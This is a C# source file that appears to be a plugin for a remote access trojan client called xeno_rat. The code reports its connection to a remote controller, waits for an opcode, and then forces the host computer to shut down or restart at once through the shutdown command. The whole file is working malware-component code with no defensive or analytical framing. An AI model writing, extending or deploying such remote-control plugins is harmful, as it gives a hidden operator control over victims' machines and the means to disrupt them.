using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Restarts the computer immediately.
        /// </summary>
        /// <remarks>
        /// This method restarts the computer by executing the "shutdown" command with the "/r /t 0" parameters, which indicates an immediate restart with a timeout of 0 seconds.
        /// </remarks>
        private void RestartComputer()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        /// <summary>
        /// Shuts down the computer immediately.
        /// </summary>
        /// <remarks>
        /// This method initiates the shutdown process for the computer, causing it to turn off immediately.
        /// </remarks>
        private void ShutdownComputer()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        /// <summary>
        /// Runs the specified node and performs actions based on the received data.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <exception cref="Exception">Thrown when there is an error in sending or receiving data.</exception>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the specified node.
        /// It then receives data from the node and checks the opcode in the received data.
        /// If the opcode is 1, it calls the ShutdownComputer method.
        /// If the opcode is 2, it calls the RestartComputer method.
        /// After performing the actions, it waits for 2000 milliseconds before completing the task.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            byte[] data = await node.ReceiveAsync();
            int opcode = data[0];
            if (opcode == 1) 
            {
                ShutdownComputer();
            }
            else if (opcode == 2) 
            {
                RestartComputer();
            }
            await Task.Delay(2000);
        }
    }
}
